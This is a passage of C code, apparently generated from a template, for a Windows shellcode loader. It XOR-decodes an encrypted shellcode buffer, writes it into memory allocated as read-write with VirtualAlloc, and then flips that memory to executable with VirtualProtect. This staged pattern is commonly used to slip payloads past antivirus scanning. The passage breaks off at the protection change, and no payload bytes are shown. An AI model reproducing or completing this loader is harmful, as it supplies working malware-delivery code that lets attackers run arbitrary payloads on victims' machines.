    unsigned char decoded[sizeof(shellcode)];

    // XOR decode
    for (int i = 0; i < sizeof(shellcode); i++) {{
        decoded[i] = shellcode[i] ^ key[i % strlen(key)];
    }}

    // Allocate memory for shellcode
    mem = VirtualAlloc(NULL, sizeof(decoded), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) {{
        printf("Memory allocation failed\\n");
        return -1;
    }}

    // Copy decoded shellcode to allocated memory
    memcpy(mem, decoded, sizeof(decoded));

    // Change memory protection to allow execution
    if (!VirtualProtect(mem, sizeof(decoded), PAGE_EXECUTE_READ, &oldProtect)) {{
